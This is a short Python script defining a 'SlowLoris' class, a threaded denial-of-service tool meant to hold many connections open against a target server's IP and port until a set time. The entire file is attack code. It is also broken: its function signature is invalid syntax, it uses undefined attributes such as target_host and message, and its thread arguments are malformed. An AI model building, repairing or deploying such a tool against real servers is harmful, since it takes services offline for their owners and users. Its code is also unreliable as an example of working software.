import socket
import threading
import time

class SlowLoris:
    def __init__(self, target_ip : str, request = None : str, target_port=80: int, attack_time=10000.0 : float, num_threads=10 : int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.epoch_termination = time.time() + float(attack_time) #epoch time that you want to terminate attack
        self.num_threads = num_threads
        if request == None:
            self.request = b'GET / HTTP/1.1\r\nHost:%s' % self.target_ip
        else:
            self.request = request.encode()
        self.request = self.request.rstrip('\r\n\r\n')
        self.terminate = False

    def thread(self, x):
        try:
            target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target.connect((self.target_ip, self.target_host))
            target.settimeout(None)
            while time.time() <= self.epoch_termination:
                target.send(self.message)
        except Exception as e:
            print('[!] thread %s: %s' % (x, e))
            

    def attack(self):
        for x in range(self.num_threads):
            thread = threading.Thread(target = self.thread, args=(x))
            thread.start()
            print('[+] began thread %s' % str(x))


                   
                
            
        
